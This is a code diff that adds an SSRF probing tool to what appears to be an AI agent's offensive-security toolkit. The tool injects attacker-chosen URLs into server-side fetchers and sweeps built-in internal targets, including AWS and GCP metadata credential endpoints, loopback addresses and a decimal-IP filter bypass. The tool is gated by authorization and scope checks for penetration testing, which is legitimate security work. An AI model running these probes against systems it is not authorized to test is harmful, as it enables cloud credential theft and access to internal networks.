@@ -3780,6 +3780,196 @@ def tool_ssrf_catcher(args: dict) -> str:
             + ("\n".join(tail) if tail else "(none)"))
 
 
+
+def _http_send(method: str, url: str, headers: dict | None = None,
+               body: bytes | None = None, timeout: int | None = None,
+               allow_redirects: bool = True) -> tuple[int, dict, str, str]:
+    """Send one HTTP request. Returns (status, resp_headers, body, error).
+    Never raises. Used by the SSRF prober so it can report the sink's response
+    headers (Location/Content-Type) that often carry the SSRF tell."""
+    import urllib.request, urllib.error
+    h = {"User-Agent": _UA, "Accept": "*/*"}
+    if headers:
+        h.update(headers)
+    to = timeout or WEB_TIMEOUT
+
+    class _NoRedirect(urllib.request.HTTPRedirectHandler):
+        def redirect_request(self, *a, **k):  # noqa: D401
+            return None
+
+    op = urllib.request.build_opener() if allow_redirects else urllib.request.build_opener(_NoRedirect)
+    req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
+    try:
+        with op.open(req, timeout=to) as resp:
+            raw = resp.read(WEB_MAXBYTES + 1)
+            txt = raw[:WEB_MAXBYTES].decode(errors="replace")
+            if len(raw) > WEB_MAXBYTES:
+                txt += f"\n[... truncated at {WEB_MAXBYTES} bytes ...]"
+            return getattr(resp, "status", 200), dict(resp.headers), txt, ""
+    except urllib.error.HTTPError as e:
+        try:
+            eh = dict(e.headers)
+        except Exception:  # noqa: BLE001
+            eh = {}
+        return e.code, eh, e.read().decode(errors="replace")[:WEB_MAXBYTES], f"HTTP {e.code}"
+    except Exception as e:  # noqa: BLE001
+        return 0, {}, "", f"{type(e).__name__}: {e}"
+
+
+# Built-in inner targets for an SSRF reachability sweep: the standard set that
+# confirms the sink reaches internal/link-local space you can't reach directly.
+_SSRF_INTERNAL = [
+    ("aws-imds",       "http://169.254.169.254/latest/meta-data/"),
+    ("aws-imds-creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+    ("gcp-metadata",   "http://metadata.google.internal/computeMetadata/v1/instance/"),
+    ("loopback",       "http://127.0.0.1/"),
+    ("loopback-name",  "http://localhost/"),
+    ("loopback-ipv6",  "http://[::1]/"),
+    ("loopback-dec",   "http://2130706433/"),          # 127.0.0.1 as a decimal int
+    ("docker-host",    "http://172.17.0.1/"),
+]
+
+
+def _ssrf_inner_headers(inner: str) -> dict:
+    """Provider quirks the sink must forward for the fetch to succeed."""
+    h = {}
+    low = inner.lower()
+    if "metadata.google.internal" in low or "169.254.169.254/computemetadata" in low:
+        h["Metadata-Flavor"] = "Google"
+    return h
+
+
+def _ssrf_inject(target: str, inner: str, method: str, param: str,
+                 field: str, body_tmpl: str) -> tuple[str, bytes | None, dict]:
+    """Place `inner` into the request per the chosen carrier. Returns
+    (url, body_bytes, extra_headers). Carriers, in priority order:
+      - body template with {{SSRF}} placeholder (raw body, any content-type)
+      - POST + field: JSON body {field: inner} (or merged into a JSON template)
+      - GET/POST + param: set/replace that query parameter with inner
+      - else: append ?url=<inner> as a sane default."""
+    import urllib.parse as up
+    extra: dict = {}
+    # 1. explicit body template
+    if body_tmpl:
+        b = body_tmpl.replace("{{SSRF}}", inner)
+        if body_tmpl.lstrip().startswith(("{", "[")):
+            extra["Content-Type"] = "application/json"
+        else:
+            extra.setdefault("Content-Type", "application/x-www-form-urlencoded")
+        return target, b.encode(), extra
+    # 2. POST + JSON field
+    if method.upper() == "POST" and field:
+        extra["Content-Type"] = "application/json"
+        return target, json.dumps({field: inner}).encode(), extra
+    # 3. query parameter
+    if param:
+        parts = up.urlsplit(target)
+        q = dict(up.parse_qsl(parts.query, keep_blank_values=True))
+        q[param] = inner
+        new = parts._replace(query=up.urlencode(q))
+        return up.urlunsplit(new), (b"" if method.upper() == "POST" else None), extra
+    # 4. default: ?url=
+    sep = "&" if up.urlsplit(target).query else "?"
+    return target + sep + "url=" + up.quote(inner, safe=""), None, extra
+
+
+def tool_ssrf(args: dict) -> str:
+    """SSRF prober for an AUTHORIZED sink. You point it at a request that the
+    target server makes on your behalf (an in-scope URL: fetcher, webhook, image
+    proxy, import-by-URL, PDF/render, CI include) and it injects an inner URL you
+    control, then reports the sink's response so you can confirm the fetch.
+
+    Two ways to confirm:
+      - blind: set the inner URL to your ssrf_catcher callback + a nonce, send,
+        then ssrf_catcher(action=check, nonce=...) to see the inbound hit.
+      - direct: read the sink's response body/headers for the fetched content.
+
+    Carriers (how the inner URL is placed): body='...{{SSRF}}...' (raw body,
+    any content-type), or method=POST + field=<json key>, or param=<query param>,
+    or the default ?url=. Auth to the sink via token/cookie/auth_header/headers.
+
+    mode=probe (default) sends one inner URL you give. mode=sweep walks a built-in
+    internal/link-local target list (AWS/GCP metadata, loopback, docker-host,
+    decimal-IP bypass) against the same sink and diffs each response against an
+    external control, flagging which internal targets the sink actually reached.
+    Scope-gated on the sink (target) via SCOPE.md + authorization, like every
+    offensive tool. The inner URL is not scope-checked — that is the whole point of
+    SSRF — so keep the sink itself in scope and the inner URLs to lab/own infra."""
+    target = str(args.get("target") or args.get("url") or args.get("sink") or "").strip()
+    gate = _authz(args, target)
+    if gate:
+        return gate
+    auth = args.get("authorization", "")
+    method = str(args.get("method") or ("POST" if (args.get("field") or args.get("body")) else "GET")).strip().upper()
+    param = str(args.get("param") or "").strip()
+    field = str(args.get("field") or "").strip()
+    body_tmpl = str(args.get("body") or "").strip()
+    mode = str(args.get("mode") or "probe").strip().lower()
+    nonce = str(args.get("nonce") or "").strip()
+    no_redir = str(args.get("follow_redirects", "1")).lower() in ("0", "false", "no")
+
+    base_headers = {}
+    for k, v in _web_auth_headers(args):
+        base_headers[k] = v
+
+    def _one(inner: str, label: str = "") -> tuple[str, int, str]:
+        eff = inner
+        if nonce:
+            if "?" in inner:
+                eff = inner + "&n=" + nonce
+            else:
+                eff = inner.rstrip("/") + "/" + nonce
+        url, body, extra = _ssrf_inject(target, eff, method, param, field, body_tmpl)
+        hdrs = dict(base_headers)
+        hdrs.update(extra)
+        hdrs.update(_ssrf_inner_headers(eff))
+        st, rhdrs, rbody, err = _http_send(method, url, hdrs, body,
+                                           timeout=min(OFFENSIVE_TIMEOUT, 30),
+                                           allow_redirects=not no_redir)
+        loc = rhdrs.get("Location") or rhdrs.get("location") or ""
+        ctype = rhdrs.get("Content-Type") or rhdrs.get("content-type") or ""
+        snip = (rbody or "").strip().replace("\n", " ")[:400]
+        tag = f"[{label}] " if label else ""
+        line = (f"{tag}{method} inner={eff}\n"
+                f"    sink-status={st or 'connect-fail'} ctype={ctype[:60]}"
+                + (f" location={loc[:120]}" if loc else "")
+                + (f" err={err}" if err and not st else "") + "\n"
+                f"    body[:400]={snip or '(empty)'}")
+        return line, st, snip
+
+    if mode == "sweep":
+        # control: an inner URL that only resolves off-box, to baseline the sink.
+        ctrl_line, ctrl_st, ctrl_snip = _one("http://sygnif-ssrf-control.invalid/", "control")
+        rows = [ctrl_line]
+        reached = []
+        for label, inner in _SSRF_INTERNAL:
+            line, st, snip = _one(inner, label)
+            rows.append(line)
+            # a differing status or non-empty body vs the control = likely reached
+            if st and (st != ctrl_st or (snip and snip != ctrl_snip)):
+                reached.append(f"{label} ({inner}) -> status {st}")
+        verdict = ("REACHED (differs from control): " + "; ".join(reached)) if reached else \
+                  "no internal target clearly differed from control (sink may block, or is not an SSRF sink)"
+        out = "SSRF reachability sweep vs external control\n\n" + "\n".join(rows) + \
+              f"\n\nverdict: {verdict}\n" + \
+              "confirm blind hits separately with ssrf_catcher(action=check)."
+        return _off_report("ssrf(sweep)", auth, f"{method} {target} <- internal sweep", out,
+                           0, "host:urllib", target)
+
+    inner = str(args.get("inner") or args.get("fetch") or args.get("fetch_url") or "").strip()
+    if not inner:
+        return ("REFUSED: mode=probe needs an 'inner' URL for the sink to fetch "
+                "(e.g. your ssrf_catcher callback, or an internal/metadata URL). "
+                "Or use mode=sweep for the built-in internal target list.")
+    line, st, _ = _one(inner)
+    out = (line + "\n\n"
+           "next: if this was your ssrf_catcher callback, run "
+           f"ssrf_catcher(action=check{', nonce=' + nonce if nonce else ''}) to confirm the "
+           "inbound hit (blind SSRF); otherwise the body/headers above are the direct read.")
+    return _off_report("ssrf(probe)", auth, f"{method} {target} inner={inner[:120]}", out,
+                       0 if st else 1, "host:urllib", target)
+
+
 BUILTIN_TOOLS: dict[str, dict] = {
     "shell": {
         "desc": (
@@ -4149,6 +4339,11 @@ BUILTIN_TOOLS: dict[str, dict] = {
         "desc": "SSRF callback listener: action=start (returns a callback URL for SSRF sinks; containers reach the host at 172.17.0.1), action=check (grep hits, optional nonce), action=stop. Your own listener; pair with the gated web/graphql tools to inject the callback.",
         "args": {"action": "start | check | stop", "port": "listener port (default 9899)", "nonce": "filter hits by nonce (action=check)"},
         "func": tool_ssrf_catcher,
+    },
+    "ssrf": {
+        "desc": ("SSRF prober for an AUTHORIZED sink (fetcher/webhook/image-proxy/import-by-URL/CI-include). Injects an inner URL you control into the sink and reports its response. mode=probe (inner=<url>, e.g. your ssrf_catcher callback) or mode=sweep (built-in internal target list: AWS/GCP metadata, loopback, docker-host, decimal-IP bypass, diffed vs an external control). Carriers: body={{SSRF}} | field=<json key> | param=<query param> | default ?url=. Auth to the sink via token/cookie/auth_header. Scope-gated on target."),
+        "args": {"target": "the sink URL you are authorized to test", "authorization": "attestation", "mode": "probe (default) | sweep", "inner": "URL the sink should fetch (mode=probe)", "param": "query param to inject into", "field": "JSON body key to inject into (POST)", "body": "raw body template with {{SSRF}} placeholder", "method": "GET (default) | POST", "nonce": "tag appended to inner for ssrf_catcher correlation", "token": "bearer token for the sink", "cookie": "cookie for the sink", "follow_redirects": "0 to not follow (see raw Location)"},
+        "func": tool_ssrf,
     },
     "takeover": {
         "desc": "Subdomain-takeover check on an authorized domain (subfinder -> subjack/nuclei). Requires target+authorization.",
